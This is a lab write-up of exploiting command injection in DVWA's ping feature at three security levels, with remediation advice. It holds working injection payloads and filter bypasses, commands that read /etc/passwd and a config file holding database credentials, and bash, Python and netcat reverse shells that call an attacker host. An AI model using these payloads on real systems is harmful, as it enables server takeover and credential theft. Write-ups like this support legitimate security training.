# Lab Write-Up: Command Injection
**Date:** 2026-08-26  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Injection  
**OWASP Top 10:** A03:2021 – Injection  

---

## 1. Introduction

Command Injection is a critical vulnerability that allows attackers to execute arbitrary operating system commands on the host server. It occurs when user-supplied input is passed directly to a system shell without proper sanitization, allowing an attacker to append additional commands using shell metacharacters.

**Goal of this lab:** Exploit the command injection vulnerability in DVWA's ping utility to execute arbitrary OS commands and extract sensitive system information.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA – Command Injection Module      |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser, Burp Suite                  |
| **Network**      | Local lab (NAT/Host-Only)            |
| **Target Shell** | Linux (bash)                         |

---

## 3. Vulnerability Overview

### What is Command Injection?

The DVWA ping feature calls the OS `ping` command with the user-supplied IP address. Without sanitization, attackers can append shell operators to inject additional commands.

**Vulnerable Code (PHP – Low Level):**
```php
$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);
echo $cmd;
```

**Common Shell Operators for Injection:**

| Operator | Behavior                                | Example                  |
|----------|-----------------------------------------|--------------------------|
| `;`      | Run commands sequentially               | `127.0.0.1; whoami`      |
| `&&`     | Run second if first succeeds            | `127.0.0.1 && id`        |
| `\|\|`  | Run second if first fails               | `127.0.0.1 \|\| id`      |
| `\|`     | Pipe output of first to second          | `127.0.0.1 \| ls`        |
| `` ` `` | Command substitution                    | `` `whoami` ``           |

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → Command Injection. Set security to **Low**.

#### Step 1 – Test Normal Behavior

Enter `127.0.0.1` in the IP field and submit.

**Output:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
...
```

#### Step 2 – Test for Injection (Semicolon)

**Payload:**
```
127.0.0.1; whoami
```

**Output:**
```
PING 127.0.0.1 ...
[ping output]
www-data
```

✅ Command injection confirmed — `whoami` returns `www-data`.

#### Step 3 – System Enumeration

**Get current user:**
```
127.0.0.1; whoami
```
Output: `www-data`

**Get hostname:**
```
127.0.0.1; hostname
```
Output: `dvwa-lab`

**Get OS information:**
```
127.0.0.1; uname -a
```
Output: `Linux dvwa-lab 5.x.x #1 SMP x86_64 GNU/Linux`

**List web root files:**
```
127.0.0.1; ls /var/www/html/dvwa
```

**Read sensitive config:**
```
127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php
```

**Output (config file):**
```php
$_DVWA['db_password'] = 'p@ssw0rd';
$_DVWA['db_user'] = 'dvwauser';
```

#### Step 4 – Read /etc/passwd

```
127.0.0.1; cat /etc/passwd
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

#### Step 5 – Establish Reverse Shell

Start a listener on Kali:
```bash
nc -lvnp 4444
```

**Payload:**
```
127.0.0.1; bash -i >& /dev/tcp/192.168.x.x/4444 0>&1
```

Or URL-safe version via Burp:
```
127.0.0.1%3B+bash+-i+>%26+/dev/tcp/192.168.x.x/4444+0>%261
```

**Result:** Reverse shell opens on attacker machine.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The `&&` and `;` operators are blacklisted. Using them returns no output.

#### Step 1 – Identify Filtered Characters

Test each operator:
```
127.0.0.1; whoami     → BLOCKED
127.0.0.1 && whoami   → BLOCKED
127.0.0.1 | whoami    → WORKS ✅
127.0.0.1 || whoami   → WORKS ✅
```

#### Step 2 – Exploit via Pipe

**Payload:**
```
127.0.0.1 | whoami
```

**Output:** `www-data`

#### Step 3 – Full Enumeration via Pipe

**Read /etc/passwd:**
```
127.0.0.1 | cat /etc/passwd
```

**Get network config:**
```
127.0.0.1 | ifconfig
```

**List processes:**
```
127.0.0.1 | ps aux
```

#### Step 4 – Alternative Bypass (Whitespace variants)

```
127.0.0.1%0awhoami         (newline character)
127.0.0.1`whoami`          (backtick substitution)
```

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The filter now also blocks `|`. However, `| ` (pipe with a space) may work, or we can use alternative methods.

#### Step 1 – Test Filtered Characters

```
127.0.0.1 | whoami     → BLOCKED
127.0.0.1 |whoami      → might work
```

#### Step 2 – Pipe Without Space (Bypass)

**Payload:**
```
127.0.0.1|whoami
```

The filter may check for `| ` (pipe + space) but not `|` alone.

**Output:** `www-data` ✅

#### Step 3 – Confirm and Enumerate

```
127.0.0.1|cat /etc/passwd
127.0.0.1|id
127.0.0.1|uname -a
```

#### Step 4 – Intercept with Burp (URL encoded)

Use Burp Repeater to send:
```
ip=127.0.0.1%7Cwhoami&Submit=Submit
```
(`%7C` = `|`)

---

## 5. Advanced: Reverse Shell via All Levels

### Netcat Listener (Kali):
```bash
nc -lvnp 4444
```

### Payload Variations:

**Bash:**
```bash
bash -i >& /dev/tcp/192.168.x.x/4444 0>&1
```

**Python:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.x.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Netcat:**
```bash
nc -e /bin/bash 192.168.x.x 4444
```

---

## 6. Findings Summary

| Security Level | Vulnerable | Operator Used | Command Executed       |
|----------------|------------|---------------|------------------------|
| Low            | ✅ Yes     | `;`           | Full enumeration       |
| Medium         | ✅ Yes     | `\|`          | Full enumeration       |
| High           | ✅ Yes     | `\|` (no space) | Full enumeration    |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 10.0     |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: High |

**Business Impact:**
- Full OS command execution on the web server
- Reading configuration files with database credentials
- Establishing persistent reverse shells
- Lateral movement within the internal network
- Complete server compromise

---

## 8. Remediation Recommendations

| Fix                            | Description                                                       |
|--------------------------------|-------------------------------------------------------------------|
| **Avoid Shell Commands**       | Use PHP's native functions instead of `exec()`, `shell_exec()`   |
| **Input Validation**           | Validate IP address format using `filter_var()` with `FILTER_VALIDATE_IP` |
| **Escapeshellarg()**           | Wrap input in `escapeshellarg()` to neutralize special characters |
| **Principle of Least Privilege** | Web server user should not have shell access                    |
| **WAF Rules**                  | Block common injection characters at network layer               |
| **Disable Dangerous PHP Functions** | Disable `exec`, `shell_exec`, `passthru`, `system` in `php.ini` |

**Secure Code Fix (PHP):**
```php
// Vulnerable
$cmd = shell_exec('ping -c 4 ' . $target);

// Secure – validate IP first
if (filter_var($target, FILTER_VALIDATE_IP)) {
    $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));
} else {
    echo "Invalid IP address";
}
```

---

## 9. References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger – OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [DVWA Write-ups – Infosec Write-ups](https://infosecwriteups.com/writeups-for-damn-vulnerable-web-application-dvwa-ba42a43afca1)
- [Hacking Articles – Command Injection](https://www.hackingarticles.in/?p=11899)
- [PayloadAllTheThings – Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – Command Injection Module
Payload:   127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php
Result:    DB credentials exposed (db_user, db_password)
Further:   Reverse shell established via bash -i >& /dev/tcp/ATTACKER/4444
Severity:  CRITICAL (CVSS 10.0)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
